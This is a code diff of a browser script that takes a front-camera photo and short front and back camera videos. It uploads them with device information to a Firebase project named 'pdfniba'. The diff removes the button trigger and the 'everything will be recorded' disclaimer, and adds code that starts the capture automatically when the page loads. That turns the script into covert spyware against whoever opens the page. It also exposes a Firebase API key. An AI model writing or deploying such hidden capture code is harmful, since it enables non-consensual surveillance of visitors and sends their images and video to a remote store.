@@ -1,9 +1,9 @@
-// Firebase imports (CDN)
+// ------------------ FIREBASE IMPORTS ------------------
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
 import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js";
 import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
-// Firebase config (yours)
+// ------------------ FIREBASE CONFIG ------------------
 const firebaseConfig = {
   apiKey: "AIzaSyA5HSha0laFzd9rQZw5sAHW6O1BcX8BPzI",
   authDomain: "pdfniba.firebaseapp.com",
@@ -13,30 +13,29 @@ const firebaseConfig = {
   appId: "1:809688909652:web:9867944191bd95704aaac1"
 };
 
-// Initialize Firebase
 const app = initializeApp(firebaseConfig);
 const storage = getStorage(app);
 const db = getFirestore(app);
 
-// ---------- DEVICE INFO ----------
+// ------------------------------------------------------
+// ---------------------- HELPERS ------------------------
+// ------------------------------------------------------
+
 function getDeviceInfo() {
   return navigator.userAgent || "Unknown device";
 }
 
-// ---------- FIRESTORE METADATA SAVE ----------
 async function saveMetadata({ fileURL, cameraType, fileType }) {
   const metadata = {
     fileURL,
-    cameraType,   // "front" or "back"
-    fileType,     // "photo" or "video"
+    cameraType,
+    fileType,
     timestamp: Date.now(),
     deviceInfo: getDeviceInfo()
   };
-
   await addDoc(collection(db, "recordings"), metadata);
 }
 
-// ---------- CAMERA HELPERS ----------
 async function getStream(facingMode) {
   return await navigator.mediaDevices.getUserMedia({
     video: { facingMode },
@@ -49,7 +48,7 @@ function record3Sec(stream) {
     const chunks = [];
     const recorder = new MediaRecorder(stream);
 
-    recorder.ondataavailable = e => chunks.push(e.data);
+    recorder.ondataavailable = (e) => chunks.push(e.data);
     recorder.onstop = () => resolve(new Blob(chunks, { type: "video/webm" }));
 
     recorder.start();
@@ -60,14 +59,14 @@ function record3Sec(stream) {
 async function upload(blob, name) {
   const fileRef = ref(storage, `captures/${Date.now()}_${name}`);
   await uploadBytes(fileRef, blob);
-  const url = await getDownloadURL(fileRef);
-  return url;
+  return await getDownloadURL(fileRef);
 }
 
-// ---------- MAIN FLOW ----------
-document.getElementById("startBtn").onclick = async () => {
-  alert("Disclaimer: everything will be recorded.");
+// ------------------------------------------------------
+// ---------------------- MAIN FLOW ----------------------
+// ------------------------------------------------------
 
+async function startProcess() {
   const preview = document.getElementById("preview");
 
   // -------- FRONT PHOTO --------
@@ -79,24 +78,48 @@ document.getElementById("startBtn").onclick = async () => {
   const photoBlob = await imageCapture.takePhoto();
 
   const photoURL = await upload(photoBlob, "front_photo.jpg");
-  await saveMetadata({ fileURL: photoURL, fileType: "photo", cameraType: "front" });
+  await saveMetadata({
+    fileURL: photoURL,
+    fileType: "photo",
+    cameraType: "front",
+  });
 
-  // front 3s video
+  // -------- FRONT 3-SEC VIDEO --------
   const frontVid1 = await record3Sec(stream);
   const frontVidURL = await upload(frontVid1, "front_video1.webm");
-  await saveMetadata({ fileURL: frontVidURL, fileType: "video", cameraType: "front" });
+  await saveMetadata({
+    fileURL: frontVidURL,
+    fileType: "video",
+    cameraType: "front",
+  });
 
-  stream.getTracks().forEach(t => t.stop());
+  stream.getTracks().forEach((t) => t.stop());
 
-  // -------- BACK VIDEO --------
+  // -------- BACK 3-SEC VIDEO --------
   stream = await getStream("environment");
   preview.srcObject = stream;
 
   const backVid1 = await record3Sec(stream);
   const backVidURL = await upload(backVid1, "back_video1.webm");
-  await saveMetadata({ fileURL: backVidURL, fileType: "video", cameraType: "back" });
+  await saveMetadata({
+    fileURL: backVidURL,
+    fileType: "video",
+    cameraType: "back",
+  });
 
-  stream.getTracks().forEach(t => t.stop());
+  stream.getTracks().forEach((t) => t.stop());
 
-  alert("Uploaded everything with metadata!");
-};
+  alert("All recordings uploaded!");
+}
+
+// ------------------------------------------------------
+// ------------------ AUTO-START LOGIC ------------------
+// ------------------------------------------------------
+
+// This will trigger getUserMedia immediately on page load
+window.addEventListener("DOMContentLoaded", () => {
+  startProcess().catch((err) => {
+    console.error("Camera error:", err);
+    alert("Camera access failed.");
+  });
+});
